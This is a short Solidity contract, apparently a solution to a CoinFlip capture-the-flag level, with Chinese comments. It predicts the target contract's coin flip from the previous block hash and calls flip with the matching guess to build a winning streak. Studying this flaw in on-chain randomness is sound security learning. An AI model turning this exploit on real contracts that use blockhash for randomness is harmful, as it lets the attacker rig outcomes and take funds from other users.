// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../CoinFlip.sol";

contract attack_CoinFlip {
    CoinFlip public immutable target;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target){
        //solidity 种创建合约实例，需要知道地址和合约类型
        target = CoinFlip(_target);
    }

    //攻击合约_guess()函数只需要算出当前side值是多少

    function _guess() public view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }

    //判断是否猜对, 同时调用受害者合约的flip，目的是使连续猜对数值增加
    function flip() external {
        bool guess = _guess();
        require(target.flip(guess),"guess failed");
    }


}